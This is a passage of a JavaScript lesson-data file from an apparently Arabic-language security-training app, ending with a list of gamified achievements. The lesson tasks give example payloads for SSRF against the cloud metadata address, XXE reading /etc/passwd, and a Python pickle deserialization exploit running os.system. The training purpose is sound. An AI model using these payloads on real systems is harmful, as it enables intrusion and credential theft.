    duration: "50 دقيقة",
    xp: 210,
    tasks: [
      { id: 1, title: "SSRF Attacks", description: "Server-Side Request Forgery", code: "curl 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'\ncurl 'http://target.com/fetch?url=http://127.0.0.1:8080/admin'", hint: "SSRF خطير على AWS لأنه يكشف الـ credentials", validation: (output) => output.includes("SSRF") || output.includes("internal") },
      { id: 2, title: "XXE Injection", description: "XML External Entity Injection", code: "<?xml version='1.0'?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM 'file:///etc/passwd'>\n]>\n<root>&xxe;</root>", hint: "XXE بتقدر تقرأ أي ملف على الـ server", validation: (output) => output.includes("XXE") || output.includes("entity") },
      { id: 3, title: "Deserialization", description: "استغلال ثغرات Deserialization", code: "import pickle, os\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('id',))\npayload = pickle.dumps(Exploit())", hint: "PHP و Java و Python عندهم ثغرات Deserialization", validation: (output) => output.includes("deserializ") || output.includes("pickle") }
    ]
  }

};

export const ACHIEVEMENTS = [
  { id: "first_lesson", icon: "🎓", title: "أول درس!", description: "اكمل أول درس" },
  { id: "10_lessons", icon: "📚", title: "المتعلم", description: "اكمل 10 دروس" },
  { id: "50_lessons", icon: "🧠", title: "الخبير", description: "اكمل 50 درس" },
  { id: "terminal_master", icon: "💻", title: "سيد Terminal", description: "جرّب Terminal 20 مرة" },
  { id: "python_master", icon: "🐍", title: "سيد Python", description: "أكمل كل دروس Python" },
  { id: "hacker", icon: "🔓", title: "الهاكر", description: "أكمل أفضل 10 أدوات" },
  { id: "1000_xp", icon: "⭐", title: "النجم", description: "اجمع 1000 XP" },
  { id: "5000_xp", icon: "💫", title: "السوبرنوفا", description: "اجمع 5000 XP" },
  { id: "leaderboard_1", icon: "👑", title: "الملك", description: "كن #1 في Leaderboard" },
  { id: "quiz_master", icon: "❓", title: "عبقري الاختبارات", description: "اجب على 50 سؤال صح" },
  { id: "lab_master", icon: "🔬", title: "سيد المعامل", description: "أكمل كل الـ Labs" },
  { id: "osint_pro", icon: "🕵️", title: "محقق OSINT", description: "أكمل كل دروس OSINT" },
  { id: "network_pro", icon: "🌐", title: "خبير الشبكات", description: "أكمل كل دروس الشبكات" },
  { id: "ctf_first", icon: "🏁", title: "أول CTF!", description: "احل أول تحدي CTF" },
  { id: "ctf_10", icon: "🏆", title: "بطل CTF", description: "احل 10 تحديات CTF" },
];
